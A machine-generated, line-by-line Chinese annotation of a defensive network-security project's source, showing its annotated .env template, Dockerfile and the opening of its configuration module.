# 项目源码逐行备注

本文档按文件列出项目自有源码与配置的逐行说明，未包含 `.venv`、缓存、日志、临时目录、数据库实例和生成产物。

- 生成时间：2026-05-05 15:12:36
- 覆盖文件数：114
- 说明方式：每一行均包含“行号 / 备注 / 原始代码”。

## 文件索引

- `.env.example`：配置
- `Dockerfile`：部署与依赖
- `config/config.py`：配置
- `docker-compose.yml`：部署与依赖
- `main.py`：后端主入口
- `requirements.txt`：部署与依赖
- `scripts/benchmark_p95.py`：运维/训练脚本
- `scripts/bootstrap_models.py`：运维/训练脚本
- `scripts/check_production_readiness.py`：运维/训练脚本
- `scripts/download_datasets.py`：运维/训练脚本
- `scripts/generate_admin_password_hash.py`：运维/训练脚本
- `scripts/train_all.py`：运维/训练脚本
- `scripts/verify_v1.py`：运维/训练脚本
- `src/__init__.py`：其他
- `src/audit/__init__.py`：审计日志
- `src/audit/security_logger.py`：审计日志
- `src/collectors/__init__.py`：后端采集
- `src/collectors/ioc_providers.py`：后端采集
- `src/collectors/ioc_repository.py`：后端采集
- `src/collectors/ioc_sync.py`：后端采集
- `src/collectors/log_collector.py`：后端采集
- `src/collectors/packet_collector.py`：后端采集
- `src/collectors/threat_intel.py`：后端采集
- `src/decision/__init__.py`：决策融合
- `src/decision/fusion_engine.py`：决策融合
- `src/detectors/__init__.py`：检测模型/规则
- `src/detectors/anomaly_detector.py`：检测模型/规则
- `src/detectors/base.py`：检测模型/规则
- `src/detectors/ddos_detector.py`：检测模型/规则
- `src/detectors/inference_meta.py`：检测模型/规则
- `src/detectors/intrusion_detector.py`：检测模型/规则
- `src/detectors/web_detector.py`：检测模型/规则
- `src/features/__init__.py`：特征工程
- `src/features/flow_features.py`：特征工程
- `src/features/flow_window_aggregator.py`：特征工程
- `src/features/pipeline.py`：特征工程
- `src/features/web_features.py`：特征工程
- `src/observability/__init__.py`：可观测性
- `src/observability/guardian_metrics.py`：可观测性
- `src/registry/__init__.py`：模型注册
- `src/registry/model_registry.py`：模型注册
- `src/response/__init__.py`：自动响应
- `src/response/firewall.py`：自动响应
- `src/response/host_isolation.py`：自动响应
- `src/response/ip_policy.py`：自动响应
- `src/response/ip_validate.py`：自动响应
- `src/response/notifier.py`：自动响应
- `src/response/persistence.py`：自动响应
- `src/response/responder.py`：自动响应
- `src/response/scheduler.py`：自动响应
- `src/response/webhook_url.py`：自动响应
- `src/schema/__init__.py`：数据结构/Schema
- `src/schema/feature_schemas.py`：数据结构/Schema
- `src/schema/inference_guard.py`：数据结构/Schema
- `src/schema/json/ioc_match_v1.json`：数据结构/Schema
- `src/schema/json/network_flow_v1.json`：数据结构/Schema
- `src/schema/json/system_behavior_v1.json`：数据结构/Schema
- `src/schema/json/web_request_v1.json`：数据结构/Schema
- `src/schema/manifest.py`：数据结构/Schema
- `src/schema/nsl_kdd_adapter.py`：数据结构/Schema
- `src/schema/persist.py`：数据结构/Schema
- `src/utils/__init__.py`：通用工具
- `src/utils/auth.py`：通用工具
- `src/utils/env_loader.py`：通用工具
- `src/utils/redis_client.py`：通用工具
- `tests/_phase8_smoke.py`：测试
- `tests/_smoke_phase7.py`：测试
- `tests/_verify_ws_events.py`：测试
- `tests/conftest.py`：测试
- `tests/e2e/__init__.py`：测试
- `tests/e2e/test_v1_acceptance.py`：测试
- `tests/e2e/verify_scenarios.py`：测试
- `tests/test_alert_stream_redis.py`：测试
- `tests/test_collectors.py`：测试
- `tests/test_db_persistence.py`：测试
- `tests/test_detectors.py`：测试
- `tests/test_features.py`：测试
- `tests/test_flow_window_aggregator.py`：测试
- `tests/test_ioc_production.py`：测试
- `tests/test_model_registry.py`：测试
- `tests/test_observability_r5.py`：测试
- `tests/test_production_hardening.py`：测试
- `tests/test_responder.py`：测试
- `tests/test_response_r4.py`：测试
- `tests/test_schema_manifest.py`：测试
- `web/__init__.py`：Web 后端支撑
- `web/alert_stream_consumer.py`：Web 后端支撑
- `web/app.py`：路由与 API
- `web/audit_integrity_patrol.py`：Web 后端支撑
- `web/database.py`：Web 后端支撑
- `web/init_db.py`：Web 后端支撑
- `web/models.py`：Web 后端支撑
- `web/observability_routes.py`：路由与 API
- `web/static/css/components.css`：前端静态资源
- `web/static/css/reports.css`：前端静态资源
- `web/static/css/theme.css`：前端静态资源
- `web/static/js/alerts.js`：前端静态资源
- `web/static/js/app.js`：前端静态资源
- `web/static/js/dashboard.js`：前端静态资源
- `web/static/js/reports.js`：前端静态资源
- `web/static/js/rules.js`：前端静态资源
- `web/static/js/settings.js`：前端静态资源
- `web/static/js/threat_intel.js`：前端静态资源
- `web/static/js/utils.js`：前端静态资源
- `web/templates/alerts.html`：前端页面模板
- `web/templates/base.html`：前端页面模板
- `web/templates/command.html`：前端页面模板
- `web/templates/dashboard.html`：前端页面模板
- `web/templates/login.html`：前端页面模板
- `web/templates/report_export.html`：前端页面模板
- `web/templates/reports.html`：前端页面模板
- `web/templates/rules.html`：前端页面模板
- `web/templates/settings.html`：前端页面模板
- `web/templates/threat_intel.html`：前端页面模板

## `.env.example`

- 类型：配置
- 行数：137

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 环境变量示例：说明运行时可配置的键和值。 | `﻿# ============================================================` |
| 2 | 配置注释：解释配置项用途。 | `# AI-Security-Guardian 环境变量模板（Phase 8）` |
| 3 | 配置注释：解释配置项用途。 | `# ------------------------------------------------------------` |
| 4 | 配置注释：解释配置项用途。 | `# 1) 复制为 .env 后再修改: cp .env.example .env` |
| 5 | 配置注释：解释配置项用途。 | `# 2) 任何真正的密钥 / 密码 / API Key 只写入 .env，永远不要提交到版本控制` |
| 6 | 配置注释：解释配置项用途。 | `# 3) 部分字段生产环境为必填，本文件以注释说明` |
| 7 | 配置注释：解释配置项用途。 | `# ============================================================` |
| 8 | 空行：分隔配置段。 | `&nbsp;` |
| 9 | 配置注释：解释配置项用途。 | `# ===== 必须配置 =====` |
| 10 | 配置注释：解释配置项用途。 | `# 使用 python -c "import secrets; print(secrets.token_hex(32))" 生成（至少 32 字符）` |
| 11 | 配置注释：解释配置项用途。 | `# 生产环境：禁止使用本文件中的示例值、dev-only 默认串；缺失或弱密钥将导致启动失败` |
| 12 | 环境变量示例：说明运行时可配置的键和值。 | `SECRET_KEY=REPLACE_ME_WITH_64_HEX_CHARS` |
| 13 | 空行：分隔配置段。 | `&nbsp;` |
| 14 | 配置注释：解释配置项用途。 | `# ===== 管理员认证 =====` |
| 15 | 环境变量示例：说明运行时可配置的键和值。 | `ADMIN_USERNAME=admin` |
| 16 | 配置注释：解释配置项用途。 | `# 【生产必填】Werkzeug 安全哈希。通过下列命令生成：` |
| 17 | 配置注释：解释配置项用途。 | `#   python scripts/generate_admin_password_hash.py` |
| 18 | 配置注释：解释配置项用途。 | `# 然后把命令输出的整行粘贴到此处（形如 pbkdf2:sha256:600000$SALT$HASH）` |
| 19 | 环境变量示例：说明运行时可配置的键和值。 | `ADMIN_PASSWORD_HASH=` |
| 20 | 配置注释：解释配置项用途。 | `# 【仅开发/测试】若未配置 ADMIN_PASSWORD_HASH，将回退到明文 ADMIN_PASSWORD；` |
| 21 | 配置注释：解释配置项用途。 | `# FLASK_ENV=production 时仅接受 ADMIN_PASSWORD_HASH，明文路径不可用。` |
| 22 | 环境变量示例：说明运行时可配置的键和值。 | `ADMIN_PASSWORD=changeme` |
| 23 | 空行：分隔配置段。 | `&nbsp;` |
| 24 | 配置注释：解释配置项用途。 | `# ===== 数据库 =====` |
| 25 | 配置注释：解释配置项用途。 | `# 开发默认：SQLite（建议先用它一键启动）` |
| 26 | 环境变量示例：说明运行时可配置的键和值。 | `DATABASE_URL=sqlite:///data/security.db` |
| 27 | 配置注释：解释配置项用途。 | `# 生产示例（请改为真实地址）：` |
| 28 | 配置注释：解释配置项用途。 | `# DATABASE_URL=mysql+pymysql://user:password@localhost/security_db` |
| 29 | 配置注释：解释配置项用途。 | `# 生产默认不在应用启动时自动建表；初始化请执行 \`python -m web.init_db\`` |
| 30 | 配置注释：解释配置项用途。 | `# 如需应急自动建表（不建议常开），可设为 true` |
| 31 | 环境变量示例：说明运行时可配置的键和值。 | `AUTO_CREATE_DB_TABLES=false` |
| 32 | 空行：分隔配置段。 | `&nbsp;` |
| 33 | 配置注释：解释配置项用途。 | `# ===== Redis =====` |
| 34 | 配置注释：解释配置项用途。 | `# 在 docker-compose 内 REDIS_HOST 会被自动设置为 "redis"；` |
| 35 | 配置注释：解释配置项用途。 | `# 本地开发默认连接 localhost:6379。` |
| 36 | 配置注释：解释配置项用途。 | `# 【生产必填】REDIS_PASSWORD 非空；compose 中有密码时 Redis 启用 requirepass` |
| 37 | 环境变量示例：说明运行时可配置的键和值。 | `REDIS_HOST=localhost` |
| 38 | 环境变量示例：说明运行时可配置的键和值。 | `REDIS_PORT=6379` |
| 39 | 环境变量示例：说明运行时可配置的键和值。 | `REDIS_DB=0` |
| 40 | 环境变量示例：说明运行时可配置的键和值。 | `REDIS_PASSWORD=` |
| 41 | 空行：分隔配置段。 | `&nbsp;` |
| 42 | 配置注释：解释配置项用途。 | `# ===== 威胁情报 API Key（可选）=====` |
| 43 | 环境变量示例：说明运行时可配置的键和值。 | `ABUSEIPDB_API_KEY=` |
| 44 | 环境变量示例：说明运行时可配置的键和值。 | `VIRUSTOTAL_API_KEY=` |
| 45 | 空行：分隔配置段。 | `&nbsp;` |
| 46 | 配置注释：解释配置项用途。 | `# ===== LLM API（可选：DeepSeek/OpenAI-compatible）=====` |
| 47 | 配置注释：解释配置项用途。 | `# 示例:` |
| 48 | 配置注释：解释配置项用途。 | `# DEEPSEEK_API_BASE=https://api.deepseek.com` |
| 49 | 配置注释：解释配置项用途。 | `# DEEPSEEK_API_KEY=sk-...` |
| 50 | 环境变量示例：说明运行时可配置的键和值。 | `DEEPSEEK_API_BASE=` |
| 51 | 环境变量示例：说明运行时可配置的键和值。 | `DEEPSEEK_API_KEY=` |
| 52 | 空行：分隔配置段。 | `&nbsp;` |
| 53 | 配置注释：解释配置项用途。 | `# ===== 告警通知（可选）=====` |
| 54 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_EMAIL=` |
| 55 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_WEBHOOK=` |
| 56 | 配置注释：解释配置项用途。 | `# SMTP（与 ALERT_EMAIL 收件人配合；需同时配置 ALERT_SMTP_HOST / FROM）` |
| 57 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_SMTP_HOST=` |
| 58 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_SMTP_PORT=587` |
| 59 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_SMTP_USER=` |
| 60 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_SMTP_PASSWORD=` |
| 61 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_SMTP_FROM=` |
| 62 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_SMTP_USE_TLS=true` |
| 63 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_NOTIFY_MAX_RETRIES=3` |
| 64 | 配置注释：解释配置项用途。 | `# 企业微信/钉钉等占位通道（true 时仅打日志，不外呼）` |
| 65 | 环境变量示例：说明运行时可配置的键和值。 | `ALERT_ENTERPRISE_CHANNEL_ENABLED=false` |
| 66 | 空行：分隔配置段。 | `&nbsp;` |
| 67 | 配置注释：解释配置项用途。 | `# ===== 响应闭环 R4（可选）=====` |
| 68 | 配置注释：解释配置项用途。 | `# 防火墙后端：iptables \| windows_placeholder \| cloud_sg_placeholder` |
| 69 | 环境变量示例：说明运行时可配置的键和值。 | `RESPONSE_FIREWALL_BACKEND=iptables` |
| 70 | 配置注释：解释配置项用途。 | `# 主机隔离：none \| logging（未配置 none 时 critical 降级为人工待办）` |
| 71 | 环境变量示例：说明运行时可配置的键和值。 | `RESPONSE_HOST_ISOLATION=none` |
| 72 | 配置注释：解释配置项用途。 | `# 生产真实封禁禁止的地址：逗号分隔 IPv4；命中则拒绝封禁（含私网段默认拒绝，见代码）` |
| 73 | 环境变量示例：说明运行时可配置的键和值。 | `RESPONSE_BUSINESS_IP_WHITELIST=` |
| 74 | 环境变量示例：说明运行时可配置的键和值。 | `RESPONSE_PRIVATE_IP_WHITELIST=` |
| 75 | 配置注释：解释配置项用途。 | `# 仅实验环境：允许对 RFC1918/CGNAT 地址下发真实 iptables（默认 false）` |
| 76 | 环境变量示例：说明运行时可配置的键和值。 | `RESPONSE_ALLOW_PRIVATE_BAN=false` |
| 77 | 空行：分隔配置段。 | `&nbsp;` |
| 78 | 配置注释：解释配置项用途。 | `# ===== 安全 & Web 配置 =====` |
| 79 | 环境变量示例：说明运行时可配置的键和值。 | `FLASK_ENV=development` |
| 80 | 环境变量示例：说明运行时可配置的键和值。 | `LOG_LEVEL=INFO` |
| 81 | 环境变量示例：说明运行时可配置的键和值。 | `API_RATE_LIMIT=100 per minute` |
| 82 | 配置注释：解释配置项用途。 | `# 逗号分隔；生产禁止 *；须为真实浏览器 Origin（含协议与主机）` |
| 83 | 环境变量示例：说明运行时可配置的键和值。 | `ALLOWED_ORIGINS=http://localhost:5000` |
| 84 | 环境变量示例：说明运行时可配置的键和值。 | `JWT_TOKEN_EXPIRES=3600` |
| 85 | 环境变量示例：说明运行时可配置的键和值。 | `JWT_REFRESH_TOKEN_EXPIRES=86400` |
| 86 | 环境变量示例：说明运行时可配置的键和值。 | `LOG_INTEGRITY_ENABLED=true` |
| 87 | 配置注释：解释配置项用途。 | `# 生产落地保护（建议 production=true）：` |
| 88 | 配置注释：解释配置项用途。 | `# true 时 Redis 不可用将直接启动失败（不允许自动降级 memory）` |
| 89 | 环境变量示例：说明运行时可配置的键和值。 | `REQUIRE_REDIS_AVAILABLE=false` |
| 90 | 配置注释：解释配置项用途。 | `# true 时关键模型文件缺失将直接启动失败` |
| 91 | 环境变量示例：说明运行时可配置的键和值。 | `REQUIRE_MODELS_READY=false` |
| 92 | 空行：分隔配置段。 | `&nbsp;` |
| 93 | 配置注释：解释配置项用途。 | `# ===== Phase 8：主入口（main.py）专用 =====` |
| 94 | 配置注释：解释配置项用途。 | `# 响应演练模式：true 时防火墙动作只打印日志，不实际执行 iptables` |
| 95 | 配置注释：解释配置项用途。 | `# 生产环境明确设置为 false 之前，请确认已有回滚/解封流程` |
| 96 | 环境变量示例：说明运行时可配置的键和值。 | `DRY_RUN=true` |
| 97 | 空行：分隔配置段。 | `&nbsp;` |
| 98 | 配置注释：解释配置项用途。 | `# 是否启用抓包入口（需要 CAP_NET_RAW 或 sudo；Docker 默认关闭）` |
| 99 | 环境变量示例：说明运行时可配置的键和值。 | `ENABLE_PACKET_CAPTURE=false` |
| 100 | 空行：分隔配置段。 | `&nbsp;` |
| 101 | 配置注释：解释配置项用途。 | `# 是否启用 Web 日志采集入口` |
| 102 | 环境变量示例：说明运行时可配置的键和值。 | `ENABLE_WEB_LOG=false` |
| 103 | 空行：分隔配置段。 | `&nbsp;` |
| 104 | 配置注释：解释配置项用途。 | `# 抓包网卡名；留空由 Scapy 自动选择默认网卡` |
| 105 | 环境变量示例：说明运行时可配置的键和值。 | `PACKET_INTERFACE=` |
| 106 | 空行：分隔配置段。 | `&nbsp;` |
| 107 | 配置注释：解释配置项用途。 | `# Web 访问日志路径（主入口会增量读取）` |
| 108 | 环境变量示例：说明运行时可配置的键和值。 | `WEB_LOG_PATH=/var/log/nginx/access.log` |
| 109 | 空行：分隔配置段。 | `&nbsp;` |
| 110 | 配置注释：解释配置项用途。 | `# 主循环每 tick 最多处理的数据包数（限流降频）` |
| 111 | 环境变量示例：说明运行时可配置的键和值。 | `MAX_PACKETS_PER_TICK=50` |
| 112 | 环境变量示例：说明运行时可配置的键和值。 | `LOOP_INTERVAL_SEC=1.0` |
| 113 | 空行：分隔配置段。 | `&nbsp;` |
| 114 | 配置注释：解释配置项用途。 | `# 模型目录（只读挂载到容器）` |
| 115 | 环境变量示例：说明运行时可配置的键和值。 | `MODEL_DIR=models/saved` |
| 116 | 配置注释：解释配置项用途。 | `# 模型交付策略：` |
| 117 | 配置注释：解释配置项用途。 | `# - repository: 模型文件随仓库/工作区交付` |
| 118 | 配置注释：解释配置项用途。 | `# - artifact: 模型文件通过制品库或共享盘单独下发` |
| 119 | 环境变量示例：说明运行时可配置的键和值。 | `MODEL_DELIVERY_MODE=artifact` |
| 120 | 配置注释：解释配置项用途。 | `# 当 MODEL_DELIVERY_MODE=artifact 时，记录模型获取地址或制品说明` |
| 121 | 环境变量示例：说明运行时可配置的键和值。 | `MODEL_ARTIFACT_URI=` |
| 122 | 空行：分隔配置段。 | `&nbsp;` |
| 123 | 配置注释：解释配置项用途。 | `# 主入口是否接入 Phase 7 Flask 工厂广播告警到前端（仅在完整链路场景使用）` |
| 124 | 环境变量示例：说明运行时可配置的键和值。 | `ENABLE_FLASK=false` |
| 125 | 空行：分隔配置段。 | `&nbsp;` |
| 126 | 配置注释：解释配置项用途。 | `# ===== Phase 8：docker 构建加速（仅国内网络需要）=====` |
| 127 | 配置注释：解释配置项用途。 | `# PIP 镜像：空则使用官方源 pypi.org` |
| 128 | 配置注释：解释配置项用途。 | `# 例: https://pypi.tuna.tsinghua.edu.cn/simple` |
| 129 | 环境变量示例：说明运行时可配置的键和值。 | `PIP_INDEX_URL=` |
| 130 | 配置注释：解释配置项用途。 | `# apt 镜像：空则使用官方 deb.debian.org` |
| 131 | 配置注释：解释配置项用途。 | `# 例: mirrors.tuna.tsinghua.edu.cn` |
| 132 | 环境变量示例：说明运行时可配置的键和值。 | `APT_MIRROR=` |
| 133 | 空行：分隔配置段。 | `&nbsp;` |
| 134 | 配置注释：解释配置项用途。 | `# ===== Phase 8：完整检测链路（guardian profile）专用 =====` |
| 135 | 配置注释：解释配置项用途。 | `# 只有执行 \`docker compose --profile full-chain up\` 时才会读取以下变量` |
| 136 | 配置注释：解释配置项用途。 | `# guardian 容器以 host 网络运行，访问 Redis 的主机地址需要写宿主机 IP / 127.0.0.1` |
| 137 | 环境变量示例：说明运行时可配置的键和值。 | `REDIS_HOST_FOR_GUARDIAN=127.0.0.1` |

## `Dockerfile`

- 类型：部署与依赖
- 行数：91

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 配置注释：解释配置项用途。 | `# AI-Security-Guardian Dockerfile（Phase 8：集成与部署）` |
| 2 | 配置注释：解释配置项用途。 | `# 对应架构文档 §11 + Phase 8 提示词 B 节` |
| 3 | 配置注释：解释配置项用途。 | `#` |
| 4 | 配置注释：解释配置项用途。 | `# 构建：` |
| 5 | 配置注释：解释配置项用途。 | `#   docker build -t ai-security-guardian:latest .` |
| 6 | 配置注释：解释配置项用途。 | `#` |
| 7 | 配置注释：解释配置项用途。 | `# 在 Docker Hub 不可达（如国内网络）的环境下，可通过 build-arg 切换 pip 镜像：` |
| 8 | 配置注释：解释配置项用途。 | `#   docker build \` |
| 9 | 配置注释：解释配置项用途。 | `#     --build-arg PIP_INDEX_URL=https://pypi.tuna.tsinghua.edu.cn/simple \` |
| 10 | 配置注释：解释配置项用途。 | `#     --build-arg APT_MIRROR=mirrors.tuna.tsinghua.edu.cn \` |
| 11 | 配置注释：解释配置项用途。 | `#     -t ai-security-guardian:latest .` |
| 12 | 配置注释：解释配置项用途。 | `#` |
| 13 | 配置注释：解释配置项用途。 | `# 如宿主机无法拉取 python:3.10-slim，可在 Docker Desktop → Settings → Docker Engine` |
| 14 | 配置注释：解释配置项用途。 | `# 的 daemon.json 中配置 registry-mirrors，例：` |
| 15 | 配置注释：解释配置项用途。 | `#   { "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"] }` |
| 16 | 配置注释：解释配置项用途。 | `# 配置后重启 Docker Desktop 再执行构建。` |
| 17 | 配置注释：解释配置项用途。 | `#` |
| 18 | 配置注释：解释配置项用途。 | `# 选型说明（按 Phase 8 提示词要求明确）：` |
| 19 | 配置注释：解释配置项用途。 | `#   - 基础镜像: python:3.10-slim` |
| 20 | 配置注释：解释配置项用途。 | `#   - 系统依赖: libpcap-dev（供 Scapy 在需要抓包时使用；Web/API 容器不会真正抓包，` |
| 21 | 配置注释：解释配置项用途。 | `#               但安装它以便同一镜像可兼做完整检测链路入口）` |
| 22 | 配置注释：解释配置项用途。 | `#   - 非 root 用户: guardian（降低容器逃逸风险）` |
| 23 | 配置注释：解释配置项用途。 | `#   - 默认启动: \`python -m web.app\`（Web/API 层，无需管理员权限）` |
| 24 | 配置注释：解释配置项用途。 | `#` |
| 25 | 配置注释：解释配置项用途。 | `# 注意：故意不使用 \`# syntax=docker/dockerfile:1.6\`，避免 buildx 在首次构建时` |
| 26 | 配置注释：解释配置项用途。 | `# 额外拉取 \`docker/dockerfile:1.6\` 前端镜像（这是部分网络下构建失败的主因）。` |
| 27 | Docker 指令：`FROM` 用于构建容器镜像。 | `FROM python:3.10-slim AS base` |
| 28 | 空行：分隔配置段。 | `&nbsp;` |
| 29 | 配置注释：解释配置项用途。 | `# ---- 构建参数（全部可通过 --build-arg 覆盖）-------------------------` |
| 30 | Docker 指令：`ARG` 用于构建容器镜像。 | `ARG PIP_INDEX_URL=https://pypi.org/simple` |
| 31 | Docker 指令：`ARG` 用于构建容器镜像。 | `ARG PIP_EXTRA_INDEX_URL=` |
| 32 | Docker 指令：`ARG` 用于构建容器镜像。 | `ARG APT_MIRROR=` |
| 33 | 空行：分隔配置段。 | `&nbsp;` |
| 34 | 配置注释：解释配置项用途。 | `# ---- 运行期环境变量 -------------------------------------------------` |
| 35 | Docker 指令：`ENV` 用于构建容器镜像。 | `ENV PYTHONDONTWRITEBYTECODE=1 \` |
| 36 | Docker 指令：`PYTHONUNBUFFERED=1` 用于构建容器镜像。 | `    PYTHONUNBUFFERED=1 \` |
| 37 | Docker 指令：`PIP_NO_CACHE_DIR=1` 用于构建容器镜像。 | `    PIP_NO_CACHE_DIR=1 \` |
| 38 | Docker 指令：`PIP_DISABLE_PIP_VERSION_CHECK=1` 用于构建容器镜像。 | `    PIP_DISABLE_PIP_VERSION_CHECK=1 \` |
| 39 | Docker 指令：`TZ=Asia/Shanghai` 用于构建容器镜像。 | `    TZ=Asia/Shanghai` |
| 40 | 空行：分隔配置段。 | `&nbsp;` |
| 41 | Docker 指令：`WORKDIR` 用于构建容器镜像。 | `WORKDIR /app` |
| 42 | 空行：分隔配置段。 | `&nbsp;` |
| 43 | 配置注释：解释配置项用途。 | `# ---- 系统依赖（可选切换 apt 源；仅保留运行必需项，减少攻击面）------` |
| 44 | 配置注释：解释配置项用途。 | `# 传入 APT_MIRROR=mirrors.tuna.tsinghua.edu.cn 即可加速国内构建。` |
| 45 | Docker 指令：`RUN` 用于构建容器镜像。 | `RUN set -eux; \` |
| 46 | Docker 指令：`if` 用于构建容器镜像。 | `    if [ -n "${APT_MIRROR}" ]; then \` |
| 47 | Docker 指令：`sed` 用于构建容器镜像。 | `        sed -i "s@deb.debian.org@${APT_MIRROR}@g" /etc/apt/sources.list.d/debian.sources 2>/dev/null \|\| true; \` |
| 48 | Docker 指令：`sed` 用于构建容器镜像。 | `        sed -i "s@deb.debian.org@${APT_MIRROR}@g" /etc/apt/sources.list 2>/dev/null \|\| true; \` |
| 49 | Docker 指令：`fi;` 用于构建容器镜像。 | `    fi; \` |
| 50 | Docker 指令：`apt-get` 用于构建容器镜像。 | `    apt-get update; \` |
| 51 | Docker 指令：`apt-get` 用于构建容器镜像。 | `    apt-get install -y --no-install-recommends \` |
| 52 | Docker 指令：`libpcap-dev` 用于构建容器镜像。 | `        libpcap-dev \` |
| 53 | Docker 指令：`ca-certificates` 用于构建容器镜像。 | `        ca-certificates \` |
| 54 | Docker 指令：`curl` 用于构建容器镜像。 | `        curl \` |
| 55 | Docker 指令：`tini;` 用于构建容器镜像。 | `        tini; \` |
| 56 | Docker 指令：`rm` 用于构建容器镜像。 | `    rm -rf /var/lib/apt/lists/*` |
| 57 | 空行：分隔配置段。 | `&nbsp;` |
| 58 | 配置注释：解释配置项用途。 | `# ---- Python 依赖（利用层缓存；requirements 先复制，后复制代码）-----` |
| 59 | Docker 指令：`COPY` 用于构建容器镜像。 | `COPY requirements.txt ./` |
| 60 | Docker 指令：`RUN` 用于构建容器镜像。 | `RUN set -eux; \` |
| 61 | Docker 指令：`EXTRA="";` 用于构建容器镜像。 | `    EXTRA=""; \` |
| 62 | Docker 指令：`if` 用于构建容器镜像。 | `    if [ -n "${PIP_EXTRA_INDEX_URL}" ]; then EXTRA="--extra-index-url ${PIP_EXTRA_INDEX_URL}"; fi; \` |
| 63 | Docker 指令：`pip` 用于构建容器镜像。 | `    pip install --no-cache-dir -i "${PIP_INDEX_URL}" ${EXTRA} -r requirements.txt` |
| 64 | 空行：分隔配置段。 | `&nbsp;` |
| 65 | 配置注释：解释配置项用途。 | `# ---- 创建非 root 用户并切换 ----------------------------------------` |
| 66 | Docker 指令：`RUN` 用于构建容器镜像。 | `RUN groupadd --system guardian \` |
| 67 | Docker 指令：`&&` 用于构建容器镜像。 | ` && useradd --system --gid guardian --home-dir /app --shell /sbin/nologin guardian` |
| 68 | 空行：分隔配置段。 | `&nbsp;` |
| 69 | 配置注释：解释配置项用途。 | `# ---- 复制应用代码 --------------------------------------------------` |
| 70 | Docker 指令：`COPY` 用于构建容器镜像。 | `COPY . .` |
| 71 | 空行：分隔配置段。 | `&nbsp;` |
| 72 | 配置注释：解释配置项用途。 | `# ---- 必要目录权限（logs / models/saved）---------------------------` |
| 73 | Docker 指令：`RUN` 用于构建容器镜像。 | `RUN mkdir -p /app/logs /app/models/saved \` |
| 74 | Docker 指令：`&&` 用于构建容器镜像。 | ` && chown -R guardian:guardian /app` |
| 75 | 空行：分隔配置段。 | `&nbsp;` |
| 76 | Docker 指令：`USER` 用于构建容器镜像。 | `USER guardian` |
| 77 | 空行：分隔配置段。 | `&nbsp;` |
| 78 | 配置注释：解释配置项用途。 | `# ---- 暴露端口（Flask/Socket.IO）-----------------------------------` |
| 79 | Docker 指令：`EXPOSE` 用于构建容器镜像。 | `EXPOSE 5000` |
| 80 | 空行：分隔配置段。 | `&nbsp;` |
| 81 | 配置注释：解释配置项用途。 | `# ---- 健康检查 ------------------------------------------------------` |
| 82 | 配置注释：解释配置项用途。 | `# 容器启动后 30s 开始探活，失败超 3 次视为不健康；/api/health 匿名豁免限流` |
| 83 | Docker 指令：`HEALTHCHECK` 用于构建容器镜像。 | `HEALTHCHECK --interval=30s --timeout=10s --start-period=30s --retries=3 \` |
| 84 | Docker 指令：`CMD` 用于构建容器镜像。 | `    CMD python -c "import sys, urllib.request; \` |
| 85 | Docker 指令：`sys.exit(0` 用于构建容器镜像。 | `sys.exit(0 if urllib.request.urlopen('http://127.0.0.1:5000/api/health', timeout=5).status == 200 else 1)" \` |
| 86 | Docker 指令：`\|\|` 用于构建容器镜像。 | `    \|\| exit 1` |
| 87 | 空行：分隔配置段。 | `&nbsp;` |
| 88 | 配置注释：解释配置项用途。 | `# ---- 入口 ----------------------------------------------------------` |
| 89 | 配置注释：解释配置项用途。 | `# 使用 tini 作为 PID 1，正确处理 SIGTERM / SIGINT，保证容器优雅停止` |
| 90 | Docker 指令：`ENTRYPOINT` 用于构建容器镜像。 | `ENTRYPOINT ["/usr/bin/tini", "--"]` |
| 91 | Docker 指令：`CMD` 用于构建容器镜像。 | `CMD ["python", "-m", "web.app"]` |

## `config/config.py`

- 类型：配置
- 行数：237

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `应用配置模块。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `安全要求：` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `- 禁止硬编码生产密钥，SECRET_KEY 必须通过环境变量提供。` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `- 区分开发、生产、测试三套配置。` |
| 7 | 函数调用：执行已有函数/方法完成当前步骤。 | `- 生产环境（FLASK_ENV=production）在 \`\`get_config()\`\` 中执行额外硬化校验。` |
| 8 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 9 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import List, Type` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from src.utils.env_loader import load_dotenv_file` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 函数调用：执行已有函数/方法完成当前步骤。 | `load_dotenv_file()` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 注释：解释下面或当前这段代码的设计意图。 | `#: 禁止在生产环境使用的 SECRET_KEY 取值（含示例与开发默认值）` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_FORBIDDEN_PRODUCTION_SECRET_KEYS: frozenset[str] = frozenset(` |
| 20 | 代码语句：参与当前文件的业务流程或数据处理。 | `    {` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "",` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "dev-only-insecure-key-never-use-in-production",` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "test-only-secret-key",` |
| 24 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "changeme",` |
| 25 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "secret",` |
